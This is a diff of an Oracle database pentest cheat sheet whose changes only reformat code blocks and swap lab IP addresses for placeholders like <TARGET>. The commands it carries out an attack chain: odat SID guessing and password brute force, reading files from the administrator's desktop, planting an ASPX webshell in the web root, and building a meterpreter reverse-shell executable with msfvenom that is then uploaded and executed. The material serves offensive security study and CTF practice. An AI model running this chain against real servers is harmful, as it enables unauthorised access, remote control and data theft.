@@ -4,7 +4,6 @@ date: 2024-7-5
 tags: ["oracle", "database", "1521", "sqlplus", "odat", "revshell", "rce"]
 ---
 
----
 ### Tools
 
 {{< tab set1 tab1 active >}}sqlplus{{< /tab >}}
@@ -13,17 +12,17 @@ tags: ["oracle", "database", "1521", "sqlplus", "odat", "revshell", "rce"]
 
 <div>
 
-```bash
+```console
 # Install
 sudo apt install oracle-instantclient-sqlplus
 ```
 
-```bash
+```console
 # export LD_LIBRARY_PATH
 export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
 ```
 
-```bash
+```console
 # Check
 sqlplus -V
 ```
@@ -35,12 +34,12 @@ sqlplus -V
 
 <div>
 
-```bash
+```console
 # Install
 sudo apt install odat
 ```
 
-```bash
+```console
 # Check
 odat --version
 ```
@@ -59,19 +58,19 @@ odat --version
 
 <div>
 
-```bash
+```console
 # SID enum (You only need one)
-odat sidguesser -s 10.10.11.10
+odat sidguesser -s <TARGET>
 ```
 
-```bash
+```console
 # User/Password brute force
-odat passwordguesser -s 10.10.11.10 -d <SID> --accounts-file accounts.txt
+odat passwordguesser -s <TARGET> -d <SID> --accounts-file accounts.txt
 ```
 
-```bash
+```console
 # Run all checks with creds as sysdba
-odat all -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba
+odat all -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba
 ```
 
 </div>
@@ -80,22 +79,22 @@ odat all -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba
 
 <div>
 
-```bash
+```console
 # Export everytime or add to ~/.zshrc
 export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
 ```
 
-```bash
+```console
 # Connect
-sqlplus <USER>/<PASSWORD>@10.10.11.10:1521/<SID>
+sqlplus '<USER>/<PASSWORD>@<TARGET>:1521/<SID>'
 ```
 
-```bash
+```console
 # Connect as sysdba (sudo)
-sqlplus <USER>/<PASSWORD>@10.10.11.10:1521/<SID> as sysdba
+sqlplus '<USER>/<PASSWORD>@<TARGET>:1521/<SID>' as sysdba
 ```
 
-```bash
+```console
 # Check privilege
 select * from user_role_privs;
 ```
@@ -109,8 +108,8 @@ select * from user_role_privs;
 
 <div>
 
-```bash
-odat ctxsys -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt
+```console
+odat ctxsys -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt
 ```
 
 </div>
@@ -119,8 +118,8 @@ odat ctxsys -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --getFile c
 
 <div>
 
-```bash
-odat dbmsadvisor -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
+```console
+odat dbmsadvisor -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
 ```
 
 </div>
@@ -129,19 +128,19 @@ odat dbmsadvisor -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --putF
 
 <div>
 
-```bash
+```console
 # Create a malicious exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o revshell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o revshell.exe
 ```
 
-```bash
+```console
 # Upload
-odat utlfile -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --putFile \\Temp revshell.exe revshell.exe
+odat utlfile -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --putFile \\Temp revshell.exe revshell.exe
 ```
 
-```bash
+```console
 # Execute
-odat externaltable -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --exec \\Temp revshell.exe
+odat externaltable -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --exec \\Temp revshell.exe
 ```
 
 </div>
